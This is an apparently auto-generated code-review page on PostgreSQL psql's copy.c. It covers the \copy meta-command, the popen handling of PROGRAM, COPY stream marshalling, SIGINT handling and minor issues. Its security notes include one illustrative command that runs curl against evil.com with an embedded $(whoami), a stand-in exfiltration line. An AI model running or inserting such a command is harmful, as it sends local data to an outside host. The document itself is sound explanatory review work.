---
path: src/bin/psql/copy.c
anchor_sha: 4b0bf0788b0
loc: 736
depth: deep
---

# copy.c

- **Source path:** `source/src/bin/psql/copy.c`
- **Lines:** 736
- **Last verified commit:** `4b0bf0788b0`
- **Companion files:** `copy.h` (3-function externs), `common.c::HandleCopyResult` (the caller for in-protocol COPY responses).

## Purpose

Two distinct responsibilities glued together:

1. **`\copy` meta-command** (`do_copy`, `parse_slash_copy`) — psql-side reimplementation of `COPY` that reads/writes a *client-side* file or pipes through a program. Turns the user's `\copy tbl FROM 'f.csv'` into the SQL `COPY tbl FROM STDIN` and streams the file into the connection.
2. **Generic COPY stream marshalling** (`handleCopyOut`, `handleCopyIn`) — given a connection that's already in `PGRES_COPY_OUT` / `PGRES_COPY_IN` state, shove bytes between the connection and a `FILE*`. Used by `common.c` for both `\copy` AND for an in-line server-side `COPY ... TO STDOUT` query.

[verified-by-code, copy.c:1-50, 263-266, 411-417]

## Role in psql

`\copy` is psql's response to the fact that backend-level `COPY ... FROM 'file'` is a *server-side* file open — a feature that needs superuser and only sees the server's filesystem. `\copy` keeps the file open on the client, then uses `COPY ... FROM STDIN` to move it.

Lifecycle: `MainLoop → HandleSlashCmds → exec_command_copy (command.c:963) → do_copy → parse_slash_copy → SendQuery("COPY ... FROM STDIN") → HandleCopyResult (common.c:938) → handleCopyIn (here)`.

## Key functions

### `parse_slash_copy(args)` — copy.c:88

Hand-rolled tokeniser over `strtokx`. Walks the `\copy` line into a `struct copy_options` with five fields:
- `before_tofrom` — accumulated `[BINARY] table [(cols)]` or `(query)`.
- `after_tofrom` — the literal options string (e.g. `WITH (FORMAT csv)`).
- `file` — the filename (or NULL for stdin/stdout/p*).
- `program` — true if `PROGRAM 'cmd'` was used.
- `psql_inout` — true for `PSTDIN`/`PSTDOUT` (use psql's own stdin/stdout, not `pset.cur_cmd_source`).
- `from` — direction.

Notable: standard_conforming_strings affects the lexer's backslash mode (`nonstd_backslash`, copy.c:94) — only when scanning the parenthesised `(query)` form. Filenames and `PROGRAM 'cmd'` are always single-quoted SQL-literal style. [verified-by-code, copy.c:88-259]

The `PROGRAM 'cmd'` arm explicitly enforces both that the token starts and ends with `'` (copy.c:215-217) — if a user writes `PROGRAM "cmd"` parse fails. This is the only quoting check; after `strip_quotes` the contents go raw to `popen`. [verified-by-code, copy.c:215-223]

### `do_copy(args)` — copy.c:267

The orchestrator:

1. `parse_slash_copy` → `options`. (copy.c:276)
2. If `options->file && !options->program`, `canonicalize_path_enc` (copy.c:283). This is a path-normalisation, **NOT** a path restriction.
3. Open the stream:
   - `from=true, file, program` → `popen(options->file, PG_BINARY_R)` (copy.c:293).
   - `from=true, file, !program` → `fopen(options->file, PG_BINARY_R)` (copy.c:296).
   - `from=true, !file, !psql_inout` → `pset.cur_cmd_source` (copy.c:299). This is the `\copy ... FROM stdin` case in a `-f script.sql` — data follows in the script.
   - `from=true, !file, psql_inout` → `stdin` (copy.c:301).
   - Same fan-out, write side, for `to`. The write-pipe arm calls `disable_sigpipe_trap` (copy.c:310).
4. If not a program, `fstat` the stream to reject directories (copy.c:336-354). Race condition: TOCTOU between `fstat` and the actual `COPY ... FROM STDIN` send — but `fopen` already opened the fd, so a swap on the path doesn't matter; the fd is what's used. [verified-by-code]
5. Build `COPY <before_tofrom> {FROM STDIN | TO STDOUT} <after_tofrom>` and `SendQuery` it with `pset.copyStream` set so `HandleCopyResult` knows to use our file (copy.c:357-372).
6. Tear down: `pclose` (with `SetShellResultVariables`) or `fclose`.

### `handleCopyOut(conn, copystream, **res)` — copy.c:433

Tight loop over `PQgetCopyData`. If `copystream` is NULL, just drain (used to keep the protocol in a sane state after an error). Continues reading even after a write error so the protocol state ends correctly. [verified-by-code, copy.c:440-457]

The long comment at copy.c:471-482 admits a libpq state-machine gap: there's no way to forcibly exit `PGRES_COPY_OUT` if libpq misbehaves; psql just calls `PQgetResult` once and hopes.

### `handleCopyIn(conn, copystream, isbinary, **res)` — copy.c:510

Key complexity: the `\.` end-of-data marker. The function reads input one line at a time (`fgets`) so it can stop at `\.\n` or `\.\r\n` BUT ONLY if input came from `pset.cur_cmd_source` — i.e. an inlined SQL script. Reading from a real CSV file does not check for `\.` because CSV legitimately allows it as data. [verified-by-code, copy.c:585-647]

SIGINT handling: a `sigsetjmp(sigint_interrupt_jmp, 1)` at the top establishes a longjmp target; the loop sets `sigint_interrupt_enabled = true` around `fread`/`fgets` (copy.c:563, 605). On Ctrl-C the longjmp jumps to `copyin_cleanup` (copy.c:696), where `PQputCopyEnd(conn, "canceled by user")` is called. [verified-by-code, copy.c:519-532, 562-609]

After data ends, the function loops on `PQgetResult` while the result is still `PGRES_COPY_IN` (copy.c:720-728), retrying `PQputCopyEnd` to force libpq out of COPY state. The comment (copy.c:711-719) admits this is a workaround for the "two consecutive COPY commands" ambiguity.

## State / globals

None. Uses `pset.encoding`, `pset.cur_cmd_source`, `pset.copyStream`, `pset.lineno`, `pset.stmt_lineno` from `settings.h`.

## Concurrency / signal handling

- `sigsetjmp` target inside `handleCopyIn` for SIGINT (copy.c:521).
- `disable_sigpipe_trap` / `restore_sigpipe_trap` around `popen` write-pipe (copy.c:310, 395) so a quit-early pager/program doesn't kill psql with SIGPIPE.
- `fflush(NULL)` before every `popen` (copy.c:291, 309) so child sees the flushed stdout. Comment-free; idiomatic.

## Phase D notes

- **`PROGRAM 'cmd'` → popen(3)** — `parse_slash_copy` requires the token be single-quoted (copy.c:215-217) then `strip_quotes` removes the quotes (copy.c:219) and `popen(options->file, …)` runs it through `/bin/sh -c` (copy.c:293, 312). There is no shell-escaping; the user typed the literal command and they get the literal command. **By design**, but the file is `pg_log_error`ed with the raw command on failure (copy.c:326) — if a user runs `\copy t FROM PROGRAM 'curl https://evil.com/$(whoami)'` and `curl` fails, the error log echoes the command including any sub-shelled output. [ISSUE-shell-injection: \copy PROGRAM is an intentional shell-exec; no warning displayed to user (nit, by-design)]
- **Path handling.** `canonicalize_path_enc` (copy.c:283) collapses `/./` and `//` and so on; it does NOT chroot or restrict. `expand_tilde` is called from `parse_slash_copy` via copy.c:240 (`\copy ... '~/file.csv'`). No symlink check, no `O_NOFOLLOW`. Documented behavior. [verified-by-code, copy.c:283; common.c:2578]
- **Directory rejection** (copy.c:340-354) uses `fstat` on the already-opened fd, which is TOCTOU-safe — the fd is what we'll read from. [verified-by-code]
- **`\.` end-marker in CSV mode.** Comment at copy.c:585-590 explicitly documents that `\.` is interpreted in text mode but not in CSV. A future input mode that the comment overlooks could fall into the wrong branch. [from-comment]
- **The cancellation message** `_("canceled by user")` (copy.c:528) is sent to the backend as the error text shown by `COPY` rollback. Documented protocol behavior.
- **Per-line accounting.** `pset.lineno++` / `pset.stmt_lineno++` only when reading from `pset.cur_cmd_source` (copy.c:649-653). For a file-source `\copy`, line numbers in psql diagnostics still point to the `\copy` invocation, not into the data file. Not a security issue; a debugging-UX one.
- **Protocol-v2 fossils.** `PQprotocolVersion(conn) < 3` branches (copy.c:527, 691, 726) exist as a comment-documented "in case you're using a pre-v14 libpq.so" safety net (copy.c:687-689). [from-comment, copy.c:687-689] [ISSUE-dead-code: protocol-v2 paths in handleCopyIn now only relevant if user dynamically links against pre-v14 libpq.so (nit)]

## Potential issues (compact)

- [ISSUE-shell-injection: \copy PROGRAM 'cmd' → popen by design; the error path echoes the literal command back (nit)]
- [ISSUE-dead-code: PQprotocolVersion < 3 fallbacks now near-impossible to trigger from modern libpq (nit)]
- [ISSUE-undocumented-invariant: handleCopyIn relies on caller setting pset.copyStream before SendQuery; HandleCopyResult uses pset.copyStream OR pset.cur_cmd_source as fallback (common.c:972) (nit)]

## Cross-references

- `command.c::exec_command_copy` (command.c:963) — the entry point.
- `common.c::HandleCopyResult` (common.c:938) — routes PGRES_COPY_IN / OUT to these functions; also chooses the stream when called from \watch / \g / regular SQL.
- `copy.h` — the externs.
- `mainloop.c` — uses sigint_interrupt_jmp similarly (mainloop.c:107).

<!-- issues:auto:begin -->
- [Issue register — `psql`](../../../../issues/psql.md)
<!-- issues:auto:end -->

## Confidence tally

`[verified-by-code]=16 [from-comment]=3 [inferred]=1`
